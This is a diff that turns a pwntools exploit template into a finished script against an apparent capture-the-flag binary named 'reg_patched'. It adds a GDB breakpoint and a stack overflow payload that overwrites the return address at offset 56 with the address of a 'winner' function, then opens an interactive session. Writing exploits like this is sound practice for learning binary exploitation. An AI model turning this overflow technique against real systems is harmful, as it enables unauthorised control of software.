@@ -2,20 +2,21 @@
 
 from pwn import *
 
-{bindings}
+e = ELF("./reg_patched")
 # libc = elf('./libc.so.6')
-# rop = ROP({bin_name})
+# rop = ROP(e)
 
-context.binary = {bin_name}
+context.binary = e
 context.terminal = ['tmux', 'split', '-h']
 
 
 def conn():
     if args.LOCAL:
-        r = process({proc_args})
+        r = process([e.path])
     elif args.GDB:
           # TODO: add break points, e.g. b *(_main + 0x12)
-        r = gdb.debug({proc_args}, '''
+        r = gdb.debug([e.path], '''
+                      b *(run + 47)
                       c
                       ''')
     elif args.REMOTE:
@@ -26,11 +27,13 @@ def conn():
 
     return r
 
-
 def main():
     r = conn()
 
-    # good luck pwning :)
+    payload = flat({
+                56: p64(e.symbols['winner']),
+                }, filler=b'\x90')
+    r.sendlineafter(b':', payload)
 
     r.interactive()
 
